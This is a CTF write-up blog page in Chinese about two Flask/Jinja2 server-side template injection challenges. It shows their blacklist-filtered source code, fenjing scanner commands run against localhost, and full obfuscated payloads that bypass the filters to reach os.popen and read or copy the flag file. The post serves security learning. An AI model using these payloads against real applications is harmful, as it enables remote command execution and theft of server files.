@@ -1,0 +1,476 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SSTI-fenjing-思路总结 | XU17</title>
+<link rel="shortcut icon" href="https://yzs17.github.io/favicon.ico?v=1734626378015">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://yzs17.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="SSTI-fenjing-思路总结 | XU17 - Atom Feed" href="https://yzs17.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="2024-pwnsecCTF-jinjia2 master
+
+SSTI模版注入，app.py源码如下
+
+from flask import Flask, request, render_template_string
+import html..." />
+    <meta name="keywords" content="CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://yzs17.github.io">
+  <img class="avatar" src="https://yzs17.github.io/images/avatar.png?v=1734626378015" alt="">
+  </a>
+  <h1 class="site-title">
+    XU17
+  </h1>
+  <p class="site-description">
+    Follow the light but walk on the darkest path
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/YZS17" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              SSTI-fenjing-思路总结
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-12-20
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+                <a href="https://yzs17.github.io/tag/CTF/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200035131.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h3 id="2024-pwnsecctf-jinjia2-master">2024-pwnsecCTF-jinjia2 master</h3>
+<ul>
+<li>SSTI模版注入，app.py源码如下</li>
+</ul>
+<pre><code class="language-Python">from flask import Flask, request, render_template_string
+import html
+
+app = Flask(__name__)
+
+BLACKLIST = [
+    'init','globals','builtins','import','os','popen','read','request','application','TemplateReference',
+    'cycler','joiner','namespace','lipsum','getitem','config','for','eval','flashed','range','class','mro',
+    'subclasses','pyfile','shell','stdout','base','if','module','RUNCMD','format','args','values','form',
+    'cookies','headers','pragma','mimetype','origin','referrer','pop','attr','chr','free','palestine','with'
+]
+
+BLACKLIST += ['0','1','2','3','4','5','6','7','8','9']
+
+BLACKLIST += [&quot;'&quot;,'&quot;',&quot;`&quot;,'\\','/','.','_','[',']','{{','}}','#']
+
+@app.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def home():
+    c = request.form.get('c') if request.method == 'POST' else None
+    error_message = None
+    rendered_template = None
+    
+    if c:
+        c = c.lower()
+        for item in BLACKLIST:
+            if item in c:
+                error_message = &quot;Invalid input detected!&quot;
+                break
+        else:
+            rendered_template = html.unescape(render_template_string(c))
+            # can you?
+            if &quot;fr3e_p4le$t1ne&amp;!&quot; in rendered_template:
+                try:
+                    with open('flag.txt', 'r') as flag_file:
+                        flag = flag_file.read()
+                    return f&quot;Flag: {flag}&quot;
+                except FileNotFoundError:
+                    return &quot;Flag file not found!&quot;
+
+    return '''
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Jinja-Master&lt;/title&gt;
+    &lt;style&gt;
+        @import url('https://fonts.googleapis.com/css2?family=VT323&amp;display=swap');
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-image: url('/static/image.jpg');
+            background-size: cover;
+            background-position: center;
+            font-family: 'VT323', monospace;
+            color: #33FF33;
+        }
+
+        .form-container {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 15px 5px rgba(0, 255, 0, 0.5);
+            max-width: 400px; 
+            width: 100%; 
+        }
+
+        .form-container input[type=&quot;text&quot;] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 2px solid #33FF33;
+            border-radius: 5px;
+            background-color: #000;
+            color: #33FF33;
+            font-size: 18px;
+            box-sizing: border-box; 
+        }
+
+        .form-container input[type=&quot;submit&quot;] {
+            width: 100%;
+            padding: 10px;
+            background-color: #33FF33;
+            border: none;
+            border-radius: 5px;
+            color: #000;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            box-sizing: border-box; 
+        }
+
+        .form-container input[type=&quot;submit&quot;]:hover {
+            background-color: #00FF00;
+        }
+
+        .result, .error {
+            margin-top: 20px;
+            padding: 10px;
+            border: 2px solid #33FF33;
+            border-radius: 5px;
+            background-color: #000;
+            color: #33FF33;
+            font-size: 18px;
+            text-align: center;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;form-container&quot;&gt;
+        &lt;form method=&quot;post&quot;&gt;
+            Enter template string: &lt;input type=&quot;text&quot; name=&quot;c&quot;&gt;
+            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
+        &lt;/form&gt;
+        
+        
+        &lt;div class=&quot;result&quot;&gt;{{ rendered_template }}{{ error_message }}&lt;/div&gt;
+        
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+    '''.replace(&quot;{{ error_message }}&quot;, error_message or &quot;&quot;).replace(&quot;{{ rendered_template }}&quot;, rendered_template or &quot;&quot;)
+</code></pre>
+<ul>
+<li>题目无回显，需要修改源码，本地调试</li>
+</ul>
+<pre><code class="language-Python">.replace(&quot;{{ rendered_template }}&quot;, rendered_template or &quot;&quot;).replace(&quot;{% if error_message %}&quot;, error_message and (&quot;&lt;div class='error'&gt;&quot; + error_message + &quot;&lt;/div&gt;&quot;) or &quot;&quot;)
+</code></pre>
+<pre><code>python -m flask run --host=0.0.0.0 --port=1520
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200027251.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>fenjing一把嗦</li>
+</ul>
+<pre><code>python -m fenjing scan --url &quot;http://127.0.0.1:1520&quot; --extra-data &quot;c=1&quot;
+</code></pre>
+<p><strong>payload</strong></p>
+<pre><code class="language-Python">c={%set at=dict(rtta=x)|first|reverse%}{%set xq=dict(so=x)|first|reverse%}{%set re=dict(daer=x)|first|reverse%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set yd=dict(a=x,b=x,c=x)|length%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set in=dict(tini=x)|first|reverse%}{%set ii=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+in+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set gl=dict(slabolg=x)|first|reverse%}{%set go=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+gl+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set ge=dict(metiteg=x)|first|reverse%}{%set gi=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+ge+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set bu=dict(snitliub=x)|first|reverse%}{%set bl=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+bu+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set im=dict(tropmi=x)|first|reverse%}{%set ip=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+im+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set yt=dict(aaaaa=x)|first|length%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}{%set pw=yd+la%}{%set iw={}|escape|list|escape|count%}{%set et=iw+lla%}{%set po=(({}|escape|urlencode|first+dict(c=x)|join)*yt)%(llla+la,llla,llla+la,sbb+et+bb+la+la,sbb+et+lla+bb)%}{%set ls=(({}|escape|urlencode|first+dict(c=x)|join)*(yd+la))%(sbb+et+lla+pw,llla+pw,iw+bb,et+bb+pw)%}{%print (((((((((((x,)|map(at,ii)|first,)|map(at,go)|first,)|map(at,gi)|first)(bl),)|map(at,gi)|first)(ip))(xq),)|map(at,po)|first)(ls),)|map(at,re)|first)()%}
+</code></pre>
+<pre><code>cat flag.txt
+</code></pre>
+<pre><code>c={%set at=dict(rtta=x)|first|reverse%}{%set xq=dict(so=x)|first|reverse%}{%set re=dict(daer=x)|first|reverse%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set yd=dict(a=x,b=x,c=x)|length%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set in=dict(tini=x)|first|reverse%}{%set ii=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+in+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set gl=dict(slabolg=x)|first|reverse%}{%set go=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+gl+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set ge=dict(metiteg=x)|first|reverse%}{%set gi=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+ge+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set bu=dict(snitliub=x)|first|reverse%}{%set bl=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+bu+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set im=dict(tropmi=x)|first|reverse%}{%set ip=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+im+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%}{%set yt=dict(aaaaa=x)|first|length%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}{%set pw=yd+la%}{%set iw={}|escape|list|escape|count%}{%set et=iw+lla%}{%set po=(({}|escape|urlencode|first+dict(c=x)|join)*yt)%(llla+la,llla,llla+la,sbb+et+bb+la+la,sbb+et+lla+bb)%}{%set cf=(({}|escape|urlencode|first+dict(c=x)|join)*(lla+la))%(sbb+et+bb,sbb+et+pw,llla+yt,iw+bb,sbb+et+bb+yd,sbb+et+lla+pw,sbb+et+pw,sbb+et+bb+pw,et+bb+yd,llla+yt,llla+bb+yd,llla+yt)%}{%print (((((((((((x,)|map(at,ii)|first,)|map(at,go)|first,)|map(at,gi)|first)(bl),)|map(at,gi)|first)(ip))(xq),)|map(at,po)|first)(cf),)|map(at,re)|first)()%}
+</code></pre>
+<ul>
+<li>成功获得本地demo的flag</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200022125.png" alt="image-20241220002258598" loading="lazy"></figure>
+<h3 id="2024-ccb-safe_proxy">2024-CCB-Safe_proxy</h3>
+<p>访问页面，得到源码如下</p>
+<pre><code class="language-Python">from flask import Flask, request, render_template_string
+import socket
+import threading
+import html
+
+app = Flask(__name__)
+
+@app.route('/', methods=[&quot;GET&quot;])
+def source():
+    with open(__file__, 'r', encoding='utf-8') as f:
+        return '&lt;pre&gt;'+html.escape(f.read())+'&lt;/pre&gt;'
+
+@app.route('/', methods=[&quot;POST&quot;])
+def template():
+    template_code = request.form.get(&quot;code&quot;)
+    # 安全过滤
+    blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\r', '\n']
+    for black in blacklist:
+        if black in template_code:
+            return &quot;Forbidden content detected!&quot;
+    result = render_template_string(template_code)
+    print(result)
+    return 'ok' if result is not None else 'error'
+
+class HTTPProxyHandler:
+    def __init__(self, target_host, target_port):
+        self.target_host = target_host
+        self.target_port = target_port
+
+    def handle_request(self, client_socket):
+        try:
+            request_data = b&quot;&quot;
+            while True:
+                chunk = client_socket.recv(4096)
+                request_data += chunk
+                if len(chunk) &lt; 4096:
+                    break
+
+            if not request_data:
+                client_socket.close()
+                return
+
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy_socket:
+                proxy_socket.connect((self.target_host, self.target_port))
+                proxy_socket.sendall(request_data)
+
+                response_data = b&quot;&quot;
+                while True:
+                    chunk = proxy_socket.recv(4096)
+                    if not chunk:
+                        break
+                    response_data += chunk
+
+            header_end = response_data.rfind(b&quot;\r\n\r\n&quot;)
+            if header_end != -1:
+                body = response_data[header_end + 4:]
+            else:
+                body = response_data
+                
+            response_body = body
+            response = b&quot;HTTP/1.1 200 OK\r\n&quot; \
+                       b&quot;Content-Length: &quot; + str(len(response_body)).encode() + b&quot;\r\n&quot; \
+                       b&quot;Content-Type: text/html; charset=utf-8\r\n&quot; \
+                       b&quot;\r\n&quot; + response_body
+
+            client_socket.sendall(response)
+        except Exception as e:
+            print(f&quot;Proxy Error: {e}&quot;)
+        finally:
+            client_socket.close()
+
+def start_proxy_server(host, port, target_host, target_port):
+    proxy_handler = HTTPProxyHandler(target_host, target_port)
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind((host, port))
+    server_socket.listen(100)
+    print(f&quot;Proxy server is running on {host}:{port} and forwarding to {target_host}:{target_port}...&quot;)
+
+    try:
+        while True:
+            client_socket, addr = server_socket.accept()
+            print(f&quot;Connection from {addr}&quot;)
+            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))
+            thread.daemon = True
+            thread.start()
+    except KeyboardInterrupt:
+        print(&quot;Shutting down proxy server...&quot;)
+    finally:
+        server_socket.close()
+
+def run_flask_app():
+    app.run(debug=False, host='127.0.0.1', port=5000)
+
+if __name__ == &quot;__main__&quot;:
+    proxy_host = &quot;0.0.0.0&quot;
+    proxy_port = 5001
+    target_host = &quot;127.0.0.1&quot;
+    target_port = 5000
+
+    # 安全反代，防止针对响应头的攻击
+    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))
+    proxy_thread.daemon = True
+    proxy_thread.start()
+
+    print(&quot;Starting Flask app...&quot;)
+    run_flask_app()
+</code></pre>
+<ul>
+<li><code>Flask-SSTI</code>，形式有点像强网杯一个题目</li>
+<li>把<code>flag</code>重定向到<code>app.py</code>上</li>
+<li>绕过<code>blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\r', '\n']</code></li>
+<li><code>__ -&gt; '_'+'_'</code></li>
+<li><code>os -&gt; 'o'+'s'</code></li>
+</ul>
+<p>最终<code>payload</code>如下</p>
+<pre><code class="language-Python">code={%set a='_'+'_'+'globals'+'_'+'_'%}{%set b='_'+'_'+'builtins'+'_'+'_'%}{%set c='_'+'_'+'impo''rt'+'_'+'_'%}{%set d='o'+'s'%}{{cycler.next[a][b][c](d)['pop''en']('cat ../../../flag &gt; app.py').read()}}
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029756.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>回退</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029730.png" alt="img" loading="lazy"></figure>
+<p><strong>后续研究</strong></p>
+<p>其实可以fenjing一把嗦，但是需要修改一下代码，改成有回显的。</p>
+<figure data-type="image" tabindex="5"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029578.png" alt="40a93733048c34b153835a040397d5d" loading="lazy"></figure>
+<pre><code>python -m fenjing scan --url &quot;http://127.0.0.1:5000&quot; --extra-data &quot;code=1&quot;
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029651.png" alt="e55316d39cd823a891b32f1b9aad922" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#2024-pwnsecctf-jinjia2-master">2024-pwnsecCTF-jinjia2 master</a></li>
+<li><a href="#2024-ccb-safe_proxy">2024-CCB-Safe_proxy</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://yzs17.github.io/post/2024ciscn-xu17/">
+              <h3 class="post-title">
+                2024-CISCN-XU17
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/YZS17" target="_blank">XU17</a>
+  <a class="rss" href="https://yzs17.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
